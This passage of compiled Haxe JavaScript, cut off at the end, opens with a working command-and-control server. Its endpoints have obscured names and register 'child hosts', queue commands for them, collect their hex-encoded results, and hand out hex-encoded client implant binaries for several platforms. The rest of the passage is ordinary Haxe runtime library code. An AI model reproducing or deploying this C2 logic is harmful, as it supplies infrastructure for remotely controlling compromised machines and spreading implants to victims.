(function ($global) { "use strict";
var $estr = function() { return js_Boot.__string_rec(this,''); },$hxEnums = $hxEnums || {},$_;
function $extend(from, fields) {
	var proto = Object.create(from);
	for (var name in fields) proto[name] = fields[name];
	if( fields.toString !== Object.prototype.toString ) proto.toString = fields.toString;
	return proto;
}
var C2Server = function() { };
C2Server.__name__ = true;
C2Server.main = function() {
	var container = new tink_http_containers_NodeContainer(tink_http_containers__$NodeContainer_ServerKindBase.Port(8000));
	container.run(new tink_http_SimpleHandler(function(req) {
		var url = req.header.url;
		var v = url.path == null ? "null" : url.path;
		process.stdout.write(Std.string("req: " + v));
		process.stdout.write("\n");
		if(req.header.url.path == "/status") {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_http_OutgoingResponse.ofString(C2Server.statusPath(req))));
		} else if(req.header.url.path == "/asdf") {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_http_OutgoingResponse.ofString(C2Server.asdfPath(req))));
		} else if(req.header.url.path == "/qwerty") {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_http_OutgoingResponse.ofString(C2Server.qwertyPath(req))));
		} else if(req.header.url.path == "/comstar") {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_http_OutgoingResponse.ofString(C2Server.comstarPath(req))));
		} else if(req.header.url.path == "/wat") {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_http_OutgoingResponse.ofString(C2Server.watPath(req))));
		} else {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_http_OutgoingResponse.ofString("Hello, World!")));
		}
	}));
};
C2Server.statusPath = function(req) {
	var tmp = "status:\n    code_tables: " + (C2Server.codes_tables == null ? "null" : haxe_ds_StringMap.stringify(C2Server.codes_tables.h)) + "\n    command_tables: " + (C2Server.command_tables == null ? "null" : haxe_ds_StringMap.stringify(C2Server.command_tables.h)) + "\n    return_tables: " + (C2Server.return_tables == null ? "null" : haxe_ds_StringMap.stringify(C2Server.return_tables.h)) + "\n\nconnected clients:\n    ";
	var _g = [];
	var h = C2Server.codes_tables.h;
	var k_h = h;
	var k_keys = Object.keys(h);
	var k_length = k_keys.length;
	var k_current = 0;
	while(k_current < k_length) {
		var k = k_keys[k_current++];
		_g.push(k);
	}
	return tmp + _g.join("\n    ") + "\n";
};
C2Server.asdfPath = function(req) {
	var url = req.header.url;
	var q = tink_url_Query.toMap(url.query);
	var code = q.h["code"];
	var ret = q.h["ret"];
	var this1 = C2Server.command_tables;
	var key = tink_url_Portion.toString(code);
	if(!Object.prototype.hasOwnProperty.call(this1.h,key)) {
		var _g = [];
		var h = C2Server.codes_tables.h;
		var k_h = h;
		var k_keys = Object.keys(h);
		var k_length = k_keys.length;
		var k_current = 0;
		while(k_current < k_length) {
			var k = k_keys[k_current++];
			_g.push(k);
		}
		var n = _g.length;
		var id = "z-" + n;
		var this1 = C2Server.codes_tables;
		var v = tink_url_Portion.toString(code);
		this1.h[id] = v;
		var this1 = C2Server.command_tables;
		var k = tink_url_Portion.toString(code);
		var v = [];
		this1.h[k] = v;
		var this1 = C2Server.return_tables;
		var k = tink_url_Portion.toString(code);
		var v = [];
		this1.h[k] = v;
		var v = "added child host: " + (code == null ? "null" : tink_url_Portion.toString(code)) + " => " + C2Server.codes_tables.h[id];
		process.stdout.write(Std.string(v));
		process.stdout.write("\n");
	}
	if(ret != null && tink_url_Portion.toString(ret) != "") {
		var ret_list = tink_url_Portion.toString(ret);
		var parsed_list = ret_list.split(",");
		var result = new Array(parsed_list.length);
		var _g = 0;
		var _g1 = parsed_list.length;
		while(_g < _g1) {
			var i = _g++;
			result[i] = haxe_io_Bytes.ofHex(parsed_list[i]).toString();
		}
		var parsed_list2 = result;
		var _g = 0;
		while(_g < parsed_list2.length) {
			var ret_s = parsed_list2[_g];
			++_g;
			var this1 = C2Server.return_tables;
			var key = tink_url_Portion.toString(code);
			this1.h[key].push(ret_s);
		}
	}
	return C2Server.zxcvPath(req);
};
C2Server.zxcvPath = function(req) {
	var url = req.header.url;
	var q = tink_url_Query.toMap(url.query);
	var code = q.h["code"];
	var this1 = C2Server.command_tables;
	var key = tink_url_Portion.toString(code);
	if(!Object.prototype.hasOwnProperty.call(this1.h,key)) {
		return "code doesnt exists!";
	}
	var this1 = C2Server.command_tables;
	var key = tink_url_Portion.toString(code);
	var coms = this1.h[key];
	var this1 = C2Server.command_tables;
	var k = tink_url_Portion.toString(code);
	var v = [];
	this1.h[k] = v;
	return "coms: [" + coms.join(",") + "]";
};
C2Server.comstarPath = function(req) {
	var url = req.header.url;
	var q = tink_url_Query.toMap(url.query);
	var id = q.h["id"];
	var com = q.h["com"];
	var this1 = C2Server.codes_tables;
	var key = tink_url_Portion.toString(id);
	if(!Object.prototype.hasOwnProperty.call(this1.h,key)) {
		return "id doesnt exist";
	}
	var this1 = C2Server.command_tables;
	var this2 = C2Server.codes_tables;
	var key = tink_url_Portion.toString(id);
	this1.h[this2.h[key]].push(tink_url_Portion.toString(com));
	var this1 = C2Server.command_tables;
	var this2 = C2Server.codes_tables;
	var key = tink_url_Portion.toString(id);
	return "batched coms: " + Std.string(this1.h[this2.h[key]]);
};
C2Server.qwertyPath = function(req) {
	var url = req.header.url;
	var q = tink_url_Query.toMap(url.query);
	var id = q.h["id"];
	var this1 = C2Server.codes_tables;
	var key = tink_url_Portion.toString(id);
	if(!Object.prototype.hasOwnProperty.call(this1.h,key)) {
		return "id doesnt exist";
	}
	var this1 = C2Server.codes_tables;
	var key = tink_url_Portion.toString(id);
	var code = this1.h[key];
	var rets = C2Server.return_tables.h[code].join("\n---\n");
	var v = [];
	C2Server.return_tables.h[code] = v;
	return "" + rets;
};
C2Server.watPath = function(req) {
	var url = req.header.url;
	var q = tink_url_Query.toMap(url.query);
	var type = q.h["type"];
	if(tink_url_Portion.toString(type) == "cpp") {
		return js_node_buffer__$Buffer_Helper.bytesOfBuffer(js_node_Fs.readFileSync("bin/C2Client.linux.x86_64/C2Client")).toHex();
	} else if(tink_url_Portion.toString(type) == "java") {
		return js_node_buffer__$Buffer_Helper.bytesOfBuffer(js_node_Fs.readFileSync("bin/C2Client/C2Client.jar")).toHex();
	} else if(tink_url_Portion.toString(type) == "python") {
		return js_node_buffer__$Buffer_Helper.bytesOfBuffer(js_node_Fs.readFileSync("bin/C2Client.py")).toHex();
	} else {
		return "wat";
	}
};
var DateTools = function() { };
DateTools.__name__ = true;
DateTools.__format_get = function(d,e) {
	switch(e) {
	case "%":
		return "%";
	case "A":
		return DateTools.DAY_NAMES[d.getDay()];
	case "B":
		return DateTools.MONTH_NAMES[d.getMonth()];
	case "C":
		return StringTools.lpad(Std.string(d.getFullYear() / 100 | 0),"0",2);
	case "D":
		return DateTools.__format(d,"%m/%d/%y");
	case "F":
		return DateTools.__format(d,"%Y-%m-%d");
	case "I":case "l":
		var hour = d.getHours() % 12;
		return StringTools.lpad(Std.string(hour == 0 ? 12 : hour),e == "I" ? "0" : " ",2);
	case "M":
		return StringTools.lpad(Std.string(d.getMinutes()),"0",2);
	case "R":
		return DateTools.__format(d,"%H:%M");
	case "S":
		return StringTools.lpad(Std.string(d.getSeconds()),"0",2);
	case "T":
		return DateTools.__format(d,"%H:%M:%S");
	case "Y":
		return Std.string(d.getFullYear());
	case "a":
		return DateTools.DAY_SHORT_NAMES[d.getDay()];
	case "b":case "h":
		return DateTools.MONTH_SHORT_NAMES[d.getMonth()];
	case "d":
		return StringTools.lpad(Std.string(d.getDate()),"0",2);
	case "e":
		return Std.string(d.getDate());
	case "H":case "k":
		return StringTools.lpad(Std.string(d.getHours()),e == "H" ? "0" : " ",2);
	case "m":
		return StringTools.lpad(Std.string(d.getMonth() + 1),"0",2);
	case "n":
		return "\n";
	case "p":
		if(d.getHours() > 11) {
			return "PM";
		} else {
			return "AM";
		}
		break;
	case "r":
		return DateTools.__format(d,"%I:%M:%S %p");
	case "s":
		return Std.string(d.getTime() / 1000 | 0);
	case "t":
		return "\t";
	case "u":
		var t = d.getDay();
		if(t == 0) {
			return "7";
		} else if(t == null) {
			return "null";
		} else {
			return "" + t;
		}
		break;
	case "w":
		return Std.string(d.getDay());
	case "y":
		return StringTools.lpad(Std.string(d.getFullYear() % 100),"0",2);
	default:
		throw new haxe_exceptions_NotImplementedException("Date.format %" + e + "- not implemented yet.",null,{ fileName : "DateTools.hx", lineNumber : 101, className : "DateTools", methodName : "__format_get"});
	}
};
DateTools.__format = function(d,f) {
	var r_b = "";
	var p = 0;
	while(true) {
		var np = f.indexOf("%",p);
		if(np < 0) {
			break;
		}
		var len = np - p;
		r_b += len == null ? HxOverrides.substr(f,p,null) : HxOverrides.substr(f,p,len);
		r_b += Std.string(DateTools.__format_get(d,HxOverrides.substr(f,np + 1,1)));
		p = np + 2;
	}
	var len = f.length - p;
	r_b += len == null ? HxOverrides.substr(f,p,null) : HxOverrides.substr(f,p,len);
	return r_b;
};
DateTools.format = function(d,f) {
	return DateTools.__format(d,f);
};
var EReg = function(r,opt) {
	this.r = new RegExp(r,opt.split("u").join(""));
};
EReg.__name__ = true;
EReg.prototype = {
	match: function(s) {
		if(this.r.global) {
			this.r.lastIndex = 0;
		}
		this.r.m = this.r.exec(s);
		this.r.s = s;
		return this.r.m != null;
	}
	,matched: function(n) {
		if(this.r.m != null && n >= 0 && n < this.r.m.length) {
			return this.r.m[n];
		} else {
			throw haxe_Exception.thrown("EReg::matched");
		}
	}
	,__class__: EReg
};
var HxOverrides = function() { };
HxOverrides.__name__ = true;
HxOverrides.cca = function(s,index) {
	var x = s.charCodeAt(index);
	if(x != x) {
		return undefined;
	}
	return x;
};
HxOverrides.substr = function(s,pos,len) {
	if(len == null) {
		len = s.length;
	} else if(len < 0) {
		if(pos == 0) {
			len = s.length + len;
		} else {
			return "";
		}
	}
	return s.substr(pos,len);
};
HxOverrides.remove = function(a,obj) {
	var i = a.indexOf(obj);
	if(i == -1) {
		return false;
	}
	a.splice(i,1);
	return true;
};
HxOverrides.now = function() {
	return Date.now();
};
Math.__name__ = true;
var Reflect = function() { };
Reflect.__name__ = true;
Reflect.field = function(o,field) {
	try {
		return o[field];
	} catch( _g ) {
		return null;
	}
};
Reflect.fields = function(o) {
	var a = [];
	if(o != null) {
		var hasOwnProperty = Object.prototype.hasOwnProperty;
		for( var f in o ) {
		if(f != "__id__" && f != "hx__closures__" && hasOwnProperty.call(o,f)) {
			a.push(f);
		}
		}
	}
	return a;
};
Reflect.copy = function(o) {
	if(o == null) {
		return null;
	}
	var o2 = { };
	var _g = 0;
	var _g1 = Reflect.fields(o);
	while(_g < _g1.length) {
		var f = _g1[_g];
		++_g;
		o2[f] = Reflect.field(o,f);
	}
	return o2;
};
var Std = function() { };
Std.__name__ = true;
Std.string = function(s) {
	return js_Boot.__string_rec(s,"");
};
Std.parseInt = function(x) {
	if(x != null) {
		var _g = 0;
		var _g1 = x.length;
		while(_g < _g1) {
			var i = _g++;
			var c = x.charCodeAt(i);
			if(c <= 8 || c >= 14 && c != 32 && c != 45) {
				var nc = x.charCodeAt(i + 1);
				var v = parseInt(x,nc == 120 || nc == 88 ? 16 : 10);
				if(isNaN(v)) {
					return null;
				} else {
					return v;
				}
			}
		}
	}
	return null;
};
Std.random = function(x) {
	if(x <= 0) {
		return 0;
	} else {
		return Math.floor(Math.random() * x);
	}
};
var StringBuf = function() {
	this.b = "";
};
StringBuf.__name__ = true;
StringBuf.prototype = {
	__class__: StringBuf
};
var StringTools = function() { };
StringTools.__name__ = true;
StringTools.startsWith = function(s,start) {
	if(s.length >= start.length) {
		return s.lastIndexOf(start,0) == 0;
	} else {
		return false;
	}
};
StringTools.endsWith = function(s,end) {
	var elen = end.length;
	var slen = s.length;
	if(slen >= elen) {
		return s.indexOf(end,slen - elen) == slen - elen;
	} else {
		return false;
	}
};
StringTools.isSpace = function(s,pos) {
	var c = HxOverrides.cca(s,pos);
	if(!(c > 8 && c < 14)) {
		return c == 32;
	} else {
		return true;
	}
};
StringTools.ltrim = function(s) {
	var l = s.length;
	var r = 0;
	while(r < l && StringTools.isSpace(s,r)) ++r;
	if(r > 0) {
		return HxOverrides.substr(s,r,l - r);
	} else {
		return s;
	}
};
StringTools.rtrim = function(s) {
	var l = s.length;
	var r = 0;
	while(r < l && StringTools.isSpace(s,l - r - 1)) ++r;
	if(r > 0) {
		return HxOverrides.substr(s,0,l - r);
	} else {
		return s;
	}
};
StringTools.trim = function(s) {
	return StringTools.ltrim(StringTools.rtrim(s));
};
StringTools.lpad = function(s,c,l) {
	if(c.length <= 0) {
		return s;
	}
	var buf_b = "";
	l -= s.length;
	while(buf_b.length < l) buf_b += c == null ? "null" : "" + c;
	buf_b += s == null ? "null" : "" + s;
	return buf_b;
};
StringTools.rpad = function(s,c,l) {
	if(c.length <= 0) {
		return s;
	}
	var buf_b = "";
	buf_b += s == null ? "null" : "" + s;
	while(buf_b.length < l) buf_b += c == null ? "null" : "" + c;
	return buf_b;
};
StringTools.replace = function(s,sub,by) {
	return s.split(sub).join(by);
};
StringTools.hex = function(n,digits) {
	var s = "";
	var hexChars = "0123456789ABCDEF";
	while(true) {
		s = hexChars.charAt(n & 15) + s;
		n >>>= 4;
		if(!(n > 0)) {
			break;
		}
	}
	if(digits != null) {
		while(s.length < digits) s = "0" + s;
	}
	return s;
};
var haxe_io_Output = function() { };
haxe_io_Output.__name__ = true;
haxe_io_Output.prototype = {
	writeByte: function(c) {
		throw new haxe_exceptions_NotImplementedException(null,null,{ fileName : "haxe/io/Output.hx", lineNumber : 47, className : "haxe.io.Output", methodName : "writeByte"});
	}
	,writeBytes: function(s,pos,len) {
		if(pos < 0 || len < 0 || pos + len > s.length) {
			throw haxe_Exception.thrown(haxe_io_Error.OutsideBounds);
		}
		var b = s.b;
		var k = len;
		while(k > 0) {
			this.writeByte(b[pos]);
			++pos;
			--k;
		}
		return len;
	}
	,close: function() {
	}
	,__class__: haxe_io_Output
};
var _$Sys_FileOutput = function(fd) {
	this.fd = fd;
};
_$Sys_FileOutput.__name__ = true;
_$Sys_FileOutput.__super__ = haxe_io_Output;
_$Sys_FileOutput.prototype = $extend(haxe_io_Output.prototype,{
	writeByte: function(c) {
		js_node_Fs.writeSync(this.fd,String.fromCodePoint(c));
	}
	,writeBytes: function(s,pos,len) {
		var data = s.b;
		return js_node_Fs.writeSync(this.fd,js_node_buffer_Buffer.from(data.buffer,data.byteOffset,s.length),pos,len);
	}
	,writeString: function(s,encoding) {
		js_node_Fs.writeSync(this.fd,s);
	}
	,flush: function() {
		js_node_Fs.fsyncSync(this.fd);
	}
	,close: function() {
		js_node_Fs.closeSync(this.fd);
	}
	,__class__: _$Sys_FileOutput
});
var haxe_io_Input = function() { };
haxe_io_Input.__name__ = true;
haxe_io_Input.prototype = {
	readByte: function() {
		throw new haxe_exceptions_NotImplementedException(null,null,{ fileName : "haxe/io/Input.hx", lineNumber : 53, className : "haxe.io.Input", methodName : "readByte"});
	}
	,readBytes: function(s,pos,len) {
		var k = len;
		var b = s.b;
		if(pos < 0 || len < 0 || pos + len > s.length) {
			throw haxe_Exception.thrown(haxe_io_Error.OutsideBounds);
		}
		try {
			while(k > 0) {
				b[pos] = this.readByte();
				++pos;
				--k;
			}
		} catch( _g ) {
			if(!((haxe_Exception.caught(_g).unwrap()) instanceof haxe_io_Eof)) {
				throw _g;
			}
		}
		return len - k;
	}
	,close: function() {
	}
	,readUntil: function(end) {
		var buf = new haxe_io_BytesBuffer();
		var last;
		while(true) {
			last = this.readByte();
			if(!(last != end)) {
				break;
			}
			buf.addByte(last);
		}
		return buf.getBytes().toString();
	}
	,__class__: haxe_io_Input
};
var _$Sys_FileInput = function(fd) {
	this.fd = fd;
};
_$Sys_FileInput.__name__ = true;
_$Sys_FileInput.__super__ = haxe_io_Input;
_$Sys_FileInput.prototype = $extend(haxe_io_Input.prototype,{
	readByte: function() {
		var buf = js_node_buffer_Buffer.alloc(1);
		try {
			js_node_Fs.readSync(this.fd,buf,0,1,null);
		} catch( _g ) {
			var e = haxe_Exception.caught(_g).unwrap();
			if(e.code == "EOF") {
				throw haxe_Exception.thrown(new haxe_io_Eof());
			} else {
				throw haxe_Exception.thrown(haxe_io_Error.Custom(e));
			}
		}
		return buf[0];
	}
	,readBytes: function(s,pos,len) {
		var data = s.b;
		var buf = js_node_buffer_Buffer.from(data.buffer,data.byteOffset,s.length);
		try {
			return js_node_Fs.readSync(this.fd,buf,pos,len,null);
		} catch( _g ) {
			var e = haxe_Exception.caught(_g).unwrap();
			if(e.code == "EOF") {
				throw haxe_Exception.thrown(new haxe_io_Eof());
			} else {
				throw haxe_Exception.thrown(haxe_io_Error.Custom(e));
			}
		}
	}
	,close: function() {
		js_node_Fs.closeSync(this.fd);
	}
	,__class__: _$Sys_FileInput
});
var haxe_StackItem = $hxEnums["haxe.StackItem"] = { __ename__:true,__constructs__:null
	,CFunction: {_hx_name:"CFunction",_hx_index:0,__enum__:"haxe.StackItem",toString:$estr}
	,Module: ($_=function(m) { return {_hx_index:1,m:m,__enum__:"haxe.StackItem",toString:$estr}; },$_._hx_name="Module",$_.__params__ = ["m"],$_)
	,FilePos: ($_=function(s,file,line,column) { return {_hx_index:2,s:s,file:file,line:line,column:column,__enum__:"haxe.StackItem",toString:$estr}; },$_._hx_name="FilePos",$_.__params__ = ["s","file","line","column"],$_)
	,Method: ($_=function(classname,method) { return {_hx_index:3,classname:classname,method:method,__enum__:"haxe.StackItem",toString:$estr}; },$_._hx_name="Method",$_.__params__ = ["classname","method"],$_)
	,LocalFunction: ($_=function(v) { return {_hx_index:4,v:v,__enum__:"haxe.StackItem",toString:$estr}; },$_._hx_name="LocalFunction",$_.__params__ = ["v"],$_)
};
haxe_StackItem.__constructs__ = [haxe_StackItem.CFunction,haxe_StackItem.Module,haxe_StackItem.FilePos,haxe_StackItem.Method,haxe_StackItem.LocalFunction];
var haxe_IMap = function() { };
haxe_IMap.__name__ = true;
haxe_IMap.__isInterface__ = true;
haxe_IMap.prototype = {
	__class__: haxe_IMap
};
var haxe_Exception = function(message,previous,native) {
	Error.call(this,message);
	this.message = message;
	this.__previousException = previous;
	this.__nativeException = native != null ? native : this;
};
haxe_Exception.__name__ = true;
haxe_Exception.caught = function(value) {
	if(((value) instanceof haxe_Exception)) {
		return value;
	} else if(((value) instanceof Error)) {
		return new haxe_Exception(value.message,null,value);
	} else {
		return new haxe_ValueException(value,null,value);
	}
};
haxe_Exception.thrown = function(value) {
	if(((value) instanceof haxe_Exception)) {
		return value.get_native();
	} else if(((value) instanceof Error)) {
		return value;
	} else {
		var e = new haxe_ValueException(value);
		return e;
	}
};
haxe_Exception.__super__ = Error;
haxe_Exception.prototype = $extend(Error.prototype,{
	unwrap: function() {
		return this.__nativeException;
	}
	,toString: function() {
		return this.get_message();
	}
	,get_message: function() {
		return this.message;
	}
	,get_native: function() {
		return this.__nativeException;
	}
	,__class__: haxe_Exception
});
var haxe__$Int64__$_$_$Int64 = function(high,low) {
	this.high = high;
	this.low = low;
};
haxe__$Int64__$_$_$Int64.__name__ = true;
haxe__$Int64__$_$_$Int64.prototype = {
	__class__: haxe__$Int64__$_$_$Int64
};
var haxe_Timer = function(time_ms) {
	var me = this;
	this.id = setInterval(function() {
		me.run();
	},time_ms);
};
haxe_Timer.__name__ = true;
haxe_Timer.delay = function(f,time_ms) {
	var t = new haxe_Timer(time_ms);
	t.run = function() {
		t.stop();
		f();
	};
	return t;
};
haxe_Timer.prototype = {
	stop: function() {
		if(this.id == null) {
			return;
		}
		clearInterval(this.id);
		this.id = null;
	}
	,run: function() {
	}
	,__class__: haxe_Timer
};
var haxe_ValueException = function(value,previous,native) {
	haxe_Exception.call(this,String(value),previous,native);
	this.value = value;
};
haxe_ValueException.__name__ = true;
haxe_ValueException.__super__ = haxe_Exception;
haxe_ValueException.prototype = $extend(haxe_Exception.prototype,{
	unwrap: function() {
		return this.value;
	}
	,__class__: haxe_ValueException
});
var haxe_io_Bytes = function(data) {
	this.length = data.byteLength;
	this.b = new Uint8Array(data);
	this.b.bufferValue = data;
	data.hxBytes = this;
	data.bytes = this.b;
};
haxe_io_Bytes.__name__ = true;
haxe_io_Bytes.ofString = function(s,encoding) {
	if(encoding == haxe_io_Encoding.RawNative) {
		var buf = new Uint8Array(s.length << 1);
		var _g = 0;
		var _g1 = s.length;
		while(_g < _g1) {
			var i = _g++;
			var c = s.charCodeAt(i);
			buf[i << 1] = c & 255;
			buf[i << 1 | 1] = c >> 8;
		}
		return new haxe_io_Bytes(buf.buffer);
	}
	var a = [];
	var i = 0;
	while(i < s.length) {
		var c = s.charCodeAt(i++);
		if(55296 <= c && c <= 56319) {
			c = c - 55232 << 10 | s.charCodeAt(i++) & 1023;
		}
		if(c <= 127) {
			a.push(c);
		} else if(c <= 2047) {
			a.push(192 | c >> 6);
			a.push(128 | c & 63);
		} else if(c <= 65535) {
			a.push(224 | c >> 12);
			a.push(128 | c >> 6 & 63);
			a.push(128 | c & 63);
		} else {
			a.push(240 | c >> 18);
			a.push(128 | c >> 12 & 63);
			a.push(128 | c >> 6 & 63);
			a.push(128 | c & 63);
		}
	}
	return new haxe_io_Bytes(new Uint8Array(a).buffer);
};
haxe_io_Bytes.ofData = function(b) {
	var hb = b.hxBytes;
	if(hb != null) {
		return hb;
	}
	return new haxe_io_Bytes(b);
};
haxe_io_Bytes.ofHex = function(s) {
	if((s.length & 1) != 0) {
		throw haxe_Exception.thrown("Not a hex string (odd number of digits)");
	}
	var a = [];
	var i = 0;
	var len = s.length >> 1;
	while(i < len) {
		var high = s.charCodeAt(i * 2);
		var low = s.charCodeAt(i * 2 + 1);
		high = (high & 15) + ((high & 64) >> 6) * 9;
		low = (low & 15) + ((low & 64) >> 6) * 9;
		a.push((high << 4 | low) & 255);
		++i;
	}
	return new haxe_io_Bytes(new Uint8Array(a).buffer);
};
haxe_io_Bytes.prototype = {
	blit: function(pos,src,srcpos,len) {
		if(pos < 0 || srcpos < 0 || len < 0 || pos + len > this.length || srcpos + len > src.length) {
			throw haxe_Exception.thrown(haxe_io_Error.OutsideBounds);
		}
		if(srcpos == 0 && len == src.b.byteLength) {
			this.b.set(src.b,pos);
		} else {
			this.b.set(src.b.subarray(srcpos,srcpos + len),pos);
		}
	}
	,sub: function(pos,len) {
		if(pos < 0 || len < 0 || pos + len > this.length) {
			throw haxe_Exception.thrown(haxe_io_Error.OutsideBounds);
		}
		return new haxe_io_Bytes(this.b.buffer.slice(pos + this.b.byteOffset,pos + this.b.byteOffset + len));
	}
	,getString: function(pos,len,encoding) {
		if(pos < 0 || len < 0 || pos + len > this.length) {
			throw haxe_Exception.thrown(haxe_io_Error.OutsideBounds);
		}
		if(encoding == null) {
			encoding = haxe_io_Encoding.UTF8;
		}
		var s = "";
		var b = this.b;
		var i = pos;
		var max = pos + len;
		switch(encoding._hx_index) {
		case 0:
			var debug = pos > 0;
			while(i < max) {
				var c = b[i++];
				if(c < 128) {
					if(c == 0) {
						break;
					}
					s += String.fromCodePoint(c);
				} else if(c < 224) {
					var code = (c & 63) << 6 | b[i++] & 127;
					s += String.fromCodePoint(code);
				} else if(c < 240) {
					var c2 = b[i++];
					var code1 = (c & 31) << 12 | (c2 & 127) << 6 | b[i++] & 127;
					s += String.fromCodePoint(code1);
				} else {
					var c21 = b[i++];
					var c3 = b[i++];
					var u = (c & 15) << 18 | (c21 & 127) << 12 | (c3 & 127) << 6 | b[i++] & 127;
					s += String.fromCodePoint(u);
				}
			}
			break;
		case 1:
			while(i < max) {
				var c = b[i++] | b[i++] << 8;
				s += String.fromCodePoint(c);
			}
			break;
		}
		return s;
	}
	,toString: function() {
		return this.getString(0,this.length);
	}
	,toHex: function() {
		var s_b = "";
		var chars = [];
		var str = "0123456789abcdef";
		var _g = 0;
		var _g1 = str.length;
		while(_g < _g1) {
			var i = _g++;
			chars.push(HxOverrides.cca(str,i));
		}
		var _g = 0;
		var _g1 = this.length;
		while(_g < _g1) {
			var i = _g++;
			var c = this.b[i];
			s_b += String.fromCodePoint(chars[c >> 4]);
			s_b += String.fromCodePoint(chars[c & 15]);
		}
		return s_b;
	}
	,__class__: haxe_io_Bytes
};
var haxe_io_Encoding = $hxEnums["haxe.io.Encoding"] = { __ename__:true,__constructs__:null
	,UTF8: {_hx_name:"UTF8",_hx_index:0,__enum__:"haxe.io.Encoding",toString:$estr}
	,RawNative: {_hx_name:"RawNative",_hx_index:1,__enum__:"haxe.io.Encoding",toString:$estr}
};
haxe_io_Encoding.__constructs__ = [haxe_io_Encoding.UTF8,haxe_io_Encoding.RawNative];
var haxe_crypto_Base64 = function() { };
haxe_crypto_Base64.__name__ = true;
haxe_crypto_Base64.encode = function(bytes,complement) {
	if(complement == null) {
		complement = true;
	}
	var str = new haxe_crypto_BaseCode(haxe_crypto_Base64.BYTES).encodeBytes(bytes).toString();
	if(complement) {
		switch(bytes.length % 3) {
		case 1:
			str += "==";
			break;
		case 2:
			str += "=";
			break;
		default:
		}
	}
	return str;
};
haxe_crypto_Base64.decode = function(str,complement) {
	if(complement == null) {
		complement = true;
	}
	if(complement) {
		while(HxOverrides.cca(str,str.length - 1) == 61) str = HxOverrides.substr(str,0,-1);
	}
	return new haxe_crypto_BaseCode(haxe_crypto_Base64.BYTES).decodeBytes(haxe_io_Bytes.ofString(str));
};
var haxe_crypto_BaseCode = function(base) {
	var len = base.length;
	var nbits = 1;
	while(len > 1 << nbits) ++nbits;
	if(nbits > 8 || len != 1 << nbits) {
		throw haxe_Exception.thrown("BaseCode : base length must be a power of two.");
	}
	this.base = base;
	this.nbits = nbits;
};
haxe_crypto_BaseCode.__name__ = true;
haxe_crypto_BaseCode.prototype = {
	encodeBytes: function(b) {
		var nbits = this.nbits;
		var base = this.base;
		var size = b.length * 8 / nbits | 0;
		var out = new haxe_io_Bytes(new ArrayBuffer(size + (b.length * 8 % nbits == 0 ? 0 : 1)));
		var buf = 0;
		var curbits = 0;
		var mask = (1 << nbits) - 1;
		var pin = 0;
		var pout = 0;
		while(pout < size) {
			while(curbits < nbits) {
				curbits += 8;
				buf <<= 8;
				buf |= b.b[pin++];
			}
			curbits -= nbits;
			out.b[pout++] = base.b[buf >> curbits & mask];
		}
		if(curbits > 0) {
			out.b[pout++] = base.b[buf << nbits - curbits & mask];
		}
		return out;
	}
	,initTable: function() {
		var tbl = [];
		var _g = 0;
		while(_g < 256) {
			var i = _g++;
			tbl[i] = -1;
		}
		var _g = 0;
		var _g1 = this.base.length;
		while(_g < _g1) {
			var i = _g++;
			tbl[this.base.b[i]] = i;
		}
		this.tbl = tbl;
	}
	,decodeBytes: function(b) {
		var nbits = this.nbits;
		var base = this.base;
		if(this.tbl == null) {
			this.initTable();
		}
		var tbl = this.tbl;
		var size = b.length * nbits >> 3;
		var out = new haxe_io_Bytes(new ArrayBuffer(size));
		var buf = 0;
		var curbits = 0;
		var pin = 0;
		var pout = 0;
		while(pout < size) {
			while(curbits < 8) {
				curbits += nbits;
				buf <<= nbits;
				var i = tbl[b.b[pin++]];
				if(i == -1) {
					throw haxe_Exception.thrown("BaseCode : invalid encoded char");
				}
				buf |= i;
			}
			curbits -= 8;
			out.b[pout++] = buf >> curbits & 255;
		}
		return out;
	}
	,__class__: haxe_crypto_BaseCode
};
var haxe_ds_Either = $hxEnums["haxe.ds.Either"] = { __ename__:true,__constructs__:null
	,Left: ($_=function(v) { return {_hx_index:0,v:v,__enum__:"haxe.ds.Either",toString:$estr}; },$_._hx_name="Left",$_.__params__ = ["v"],$_)
	,Right: ($_=function(v) { return {_hx_index:1,v:v,__enum__:"haxe.ds.Either",toString:$estr}; },$_._hx_name="Right",$_.__params__ = ["v"],$_)
};
haxe_ds_Either.__constructs__ = [haxe_ds_Either.Left,haxe_ds_Either.Right];
var haxe_ds_ObjectMap = function() {
	this.h = { __keys__ : { }};
};
haxe_ds_ObjectMap.__name__ = true;
haxe_ds_ObjectMap.__interfaces__ = [haxe_IMap];
haxe_ds_ObjectMap.prototype = {
	get: function(key) {
		return this.h[key.__id__];
	}
	,exists: function(key) {
		return this.h.__keys__[key.__id__] != null;
	}
	,keys: function() {
		var a = [];
		for( var key in this.h.__keys__ ) {
		if(this.h.hasOwnProperty(key)) {
			a.push(this.h.__keys__[key]);
		}
		}
		return new haxe_iterators_ArrayIterator(a);
	}
	,iterator: function() {
		return { ref : this.h, it : this.keys(), hasNext : function() {
			return this.it.hasNext();
		}, next : function() {
			var i = this.it.next();
			return this.ref[i.__id__];
		}};
	}
	,__class__: haxe_ds_ObjectMap
};
var haxe_ds_Option = $hxEnums["haxe.ds.Option"] = { __ename__:true,__constructs__:null
	,Some: ($_=function(v) { return {_hx_index:0,v:v,__enum__:"haxe.ds.Option",toString:$estr}; },$_._hx_name="Some",$_.__params__ = ["v"],$_)
	,None: {_hx_name:"None",_hx_index:1,__enum__:"haxe.ds.Option",toString:$estr}
};
haxe_ds_Option.__constructs__ = [haxe_ds_Option.Some,haxe_ds_Option.None];
var haxe_ds_StringMap = function() {
	this.h = Object.create(null);
};
haxe_ds_StringMap.__name__ = true;
haxe_ds_StringMap.__interfaces__ = [haxe_IMap];
haxe_ds_StringMap.stringify = function(h) {
	var s = "{";
	var first = true;
	for (var key in h) {
		if (first) first = false; else s += ',';
		s += key + ' => ' + Std.string(h[key]);
	}
	return s + "}";
};
haxe_ds_StringMap.prototype = {
	exists: function(key) {
		return Object.prototype.hasOwnProperty.call(this.h,key);
	}
	,get: function(key) {
		return this.h[key];
	}
	,keys: function() {
		return new haxe_ds__$StringMap_StringMapKeyIterator(this.h);
	}
	,iterator: function() {
		return new haxe_ds__$StringMap_StringMapValueIterator(this.h);
	}
	,__class__: haxe_ds_StringMap
